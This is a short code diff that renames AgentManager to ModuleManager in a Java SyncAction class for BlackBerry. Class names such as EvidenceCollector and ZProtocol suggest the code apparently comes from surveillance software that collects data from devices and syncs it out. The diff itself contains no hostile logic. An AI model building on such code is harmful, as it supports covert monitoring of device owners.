@@ -12,7 +12,7 @@ package blackberry.action.sync;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
-import blackberry.AgentManager;
+import blackberry.ModuleManager;
 import blackberry.Trigger;
 import blackberry.action.SubActionMain;
 import blackberry.action.sync.protocol.ProtocolException;
@@ -30,7 +30,7 @@ public abstract class SyncAction extends SubActionMain {
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
     //#endif
     protected EvidenceCollector logCollector;
-    protected AgentManager agentManager;
+    protected ModuleManager agentManager;
     // protected Transport[] transports = new Transport[Transport.NUM];
     protected Vector transports;
     protected Protocol protocol;
@@ -41,7 +41,7 @@ public abstract class SyncAction extends SubActionMain {
         super(conf);
 
         logCollector = EvidenceCollector.getInstance();
-        agentManager = AgentManager.getInstance();
+        agentManager = ModuleManager.getInstance();
         transports = new Vector();
 
         protocol = new ZProtocol();
